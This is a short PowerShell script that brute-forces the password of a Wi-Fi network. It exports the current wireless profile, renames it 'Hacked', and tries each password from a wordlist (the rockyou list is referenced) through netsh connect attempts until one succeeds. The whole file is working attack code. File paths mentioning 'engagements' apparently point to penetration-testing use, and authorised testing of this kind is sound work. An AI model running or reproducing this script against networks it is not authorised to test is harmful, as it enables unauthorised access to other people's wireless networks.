$cn=(((netsh wlan show interfaces)-match"ssid")[0] -split '(?<=: )')[-1] #Get connection SSID name
$cs=((netsh wlan show interfaces)-match"state")[0].split(": ")[-1] #Get connection status
$ts=netsh wlan export profile $cn #saves currently connected profile to disk
$ts1=(($ts -split '(?<= ")'))[-2] #split saved file location
$ts2=(($ts1 -split '(?<=xml)'))[0] #further splits saved file location
[xml]$file=gc $ts2 #converts saved profile to xml object
$file.WLANProfile.name = "Hacked" #edits profile name to "Hacked"
$file.WLANProfile.MSM.security.sharedKey.protected = "false" #disables password encryption
#$wordlist = "c:\users\...[snip]...\documents\engagements\rockyou.txt" #uses rockyou password list
$wordlist = "c:\users\...[snip]...\documents\engagements\test.txt" #uses a significantly smaller password list containing valid pw


netsh wlan disconnect;
foreach($w in gc $wordlist){
	$file.WLANProfile.name = "Hacked";
	$file.WLANProfile.MSM.security.sharedKey.keyMaterial = $w.tostring();
	$file.save("Hacked.xml");
	netsh wlan add profile filename="Hacked.xml";
	netsh wlan connect name="Hacked";
	sleep(5)
	$cs2=((netsh wlan show interfaces)-match"state")[0].split(": ")[-1];
	if($cs2 -eq "connected"){
		write-host "You have connected to $cn with $w.";
		break;
	}
	else{
		write-host "Failed to connect using $w, sleeping for 5 seconds."
		continue;
	}
}
